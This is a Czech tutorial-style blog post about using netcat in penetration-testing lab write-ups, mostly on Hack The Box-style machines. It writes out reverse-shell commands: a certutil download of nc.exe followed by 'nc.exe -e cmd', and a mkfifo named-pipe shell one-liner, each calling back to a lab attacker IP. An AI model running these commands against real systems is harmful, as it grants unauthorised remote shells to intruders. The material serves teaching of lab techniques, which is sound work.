---
layout: post
author: Tomáš Matějíček
title: "Netcat a nc"
date: 2019-11-28
tags: nastroje shells listeners tcp file-transfer post-exploitation
---
## Úvod a kontext

`netcat` nebo zkráceně `nc` se v tomto projektu objevuje všude tam, kde je potřeba rychle přenést útok z křehkého prvního kroku do normálního pracovního shellu nebo kde stačí jednoduchá TCP komunikace bez složitého klienta. Není to exploit framework a není to nástroj na objevování zranitelností. Je to velmi univerzální transportní pomocník.

Na [Develu](/devel), [Buffu](/buff), [Bankrobberu](/bankrobber) nebo [RE](/re) slouží jako nejkratší cesta od command execution k reverznímu shellu. Na [Nibbles](/nibbles), [Schooled](/schooled) nebo [SwagShopu](/swagshop) řeší named-pipe shell na Linuxu tam, kde `-e` není k dispozici. Na [PlayerTwo](/playertwo) nebo [Scavengeru](/scavenger) se používá spíš jako jednoduchý TCP klient pro lokální službu. Právě tahle šíře je jeho praktická hodnota.

## Co `netcat` v praxi řeší

`netcat` je jednoduchý TCP/UDP klient a listener. V místních rozborech odpovídá hlavně na tyto otázky:

- jak z command execution rychle udělat interaktivní shell,
- jak si otevřít listener na návrat spojení,
- jak obsloužit jednoduchý raw TCP protokol bez speciálního klienta,
- a jak přenést data nebo propojit procesy tam, kde stačí obyčejný socket.

Jeho síla není v bohatosti funkcí. Je v tom, že pro velkou část mezikroků v post-exploitation stačí právě obyčejný socket a nic víc.

## Nejčastější scénáře využití v tomto projektu

### Reverzní shell po prvním command execution

Na [Develu](/devel) nebo [Buffu](/buff) je role nástroje velmi čistá. Webshell nebo jednoduché RCE samy o sobě nejsou pohodlný pracovní kontext, takže dává smysl doručit `nc.exe` a přepnout se do normálního shellu:

```bash
certutil.exe -urlcache -split -f http://10.10.14.5:8000/exe/nc.exe c:\programdata\nc.exe
c:\programdata\nc.exe -e cmd 10.10.14.5 4000
```

Tady `netcat` neřeší původní zranitelnost. Jen z jednorázového kódu na hostu vytvoří pracovní shell, se kterým už jde normálně dělat další enumerace a privesc.

Podobně funguje i na [Bankrobberu](/bankrobber), [Arkhamu](/arkham) nebo [RE](/re), kde jde vždy o stejný pattern:

- něco dovolí spustit příkaz,
- `nc.exe` se doručí na host,
- a teprve potom vznikne stabilní shell.

### Listener na útočníkově straně

V mnoha rozborech `netcat` vystupuje i z druhé strany jako nejjednodušší listener:

```bash
netcat -lvp 4000
```

To je prakticky důležité hlavně proto, že většina řetězců nepotřebuje plný session manager. Potřebuje jen:

- poslouchat na portu,
- přijmout shell,
- a hned pokračovat v ruční práci.

Tady se `netcat` výborně doplňuje s nástroji typu [certutil](/nastroje/certutil) nebo [Metasploit: msfconsole a msfvenom](/nastroje/metasploit-msfconsole-a-msfvenom). Pokud není potřeba handler, `netcat` bývá jednodušší a rychlejší.

### Named-pipe shell na Linuxu

Na Linuxu často narazíte na variantu, kde `nc` nemá přepínač `-e` nebo je dostupná jiná implementace. V takové chvíli se v projektu opakuje named-pipe pattern:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.22 4000 > /tmp/f
```

To je dobře vidět třeba na [Nibbles](/nibbles), [Schooled](/schooled), [Boltu](/bolt), [Luanne](/luanne) nebo [SwagShopu](/swagshop).

Praktická hodnota je zřejmá:

- shell jde spustit i bez `-e`,
- stačí běžné systémové utility,
- a útok může zůstat velmi lehký bez dalších závislostí.

### Jednoduchý raw TCP klient pro lokální služby

Na [Scavengeru](/scavenger) se `nc` používá k ruční obsluze lokální SMTP služby. Na [PlayerTwo](/playertwo) pomáhá napojit stdin/stdout na lokální SUID helper přes pojmenovanou rouru. Na [Bankrobberu](/bankrobber) se přes `nc.exe` osahává interní port `910`.

To je další praktická role, která se snadno přehlédne. `netcat` není jen shell nástroj. Je to často nejrychlejší způsob, jak:

- ručně mluvit s jednoduchým TCP endpointem,
- ověřit chování interní služby,
- nebo si postavit velmi malý jednorázový most mezi procesem a socketem.

## Kdy je `netcat` nejlepší volba

Největší smysl dává tehdy, když:

- už existuje command execution a chybí jen shell,
- potřebujete jednoduchý listener,
- nebo chcete rychle obsloužit nebo otestovat surový TCP endpoint bez specializovaného klienta.

V těchto situacích bývá praktičtější než těžší framework nebo vlastní skript.

## Co `netcat` neumí vyřešit za vás

`netcat`:

- sám neotevře command execution,
- nevytvoří pivot,
- neřeší autentizaci,
- a neposkytuje session management jako plnohodnotný framework.

Na [Develu](/devel) ho musí předcházet webshell. Na [RE](/re) dokumentová pipeline. Na [Doctoru](/doctor) vzdálené doručení Splunk appky. `netcat` řeší transport posledního kroku, ne jeho příčinu.

## Nejčastější chyby při použití

### Záměna shell payloadu za samotný exploit

Na mnoha hostech se snadno začne mluvit o "netcat exploitu", ale příčinou bývá vždy něco jiného:

- upload,
- command injection,
- služba s chybnými právy,
- nebo doručený payload.

### Ignorování rozdílu mezi implementacemi

Ne každé `nc` podporuje stejné přepínače. Právě proto se v projektu opakují i varianty s `mkfifo`, které jsou přenositelnější než slepá důvěra v `-e`.

### Použití tam, kde je potřeba víc než jen socket

Jakmile potřebujete:

- složitější session handling,
- modulový exploit,
- nebo víc paralelních session,

pak může být praktičtější jiný nástroj. `netcat` je silný právě svou jednoduchostí.

## Nejčastější praktické scénáře

### Potřebuji převést první command execution na interaktivní shell

To je [Devel](/devel), [Buff](/buff), [Bankrobber](/bankrobber) nebo [RE](/re).

### Potřebuji jednoduchý listener na reverzní shell

To je prakticky velká část linuxových i windowsových rozborů.

### Potřebuji mluvit s jednoduchou lokální TCP službou nebo propojit proces se socketem

To je [Scavenger](/scavenger), [PlayerTwo](/playertwo) nebo části [Bankrobberu](/bankrobber).

## Související články v projektu

- Rozbory: [Devel](/devel), [Buff](/buff), [Bankrobber](/bankrobber), [RE](/re), [Nibbles](/nibbles), [PlayerTwo](/playertwo), [Scavenger](/scavenger), [Doctor](/doctor)
- Nástroje: [certutil](/nastroje/certutil), [Metasploit: msfconsole a msfvenom](/nastroje/metasploit-msfconsole-a-msfvenom)
- Techniky: [Windows lokální privesc přes služby, drivery a spooler](/techniky/windows-lokalni-privesc-pres-sluzby-drivery-a-spooler), [Zápis do prostoru, který se pak vykoná nebo použije pro autentizaci](/techniky/zapis-do-prostoru-ktery-se-pak-vykona-nebo-pouzije-pro-autentizaci)

## Co si odnést do praxe

- `netcat` je v praxi nejcennější jako jednoduchý transportní nástroj pro shell, listener nebo raw TCP komunikaci.
- Největší hodnotu má tam, kde už útok existuje a je potřeba ho jen převést do pohodlnějšího pracovního kontextu.
- Nejde o exploit. Jde o velmi lehké lepidlo mezi procesem a socketem.
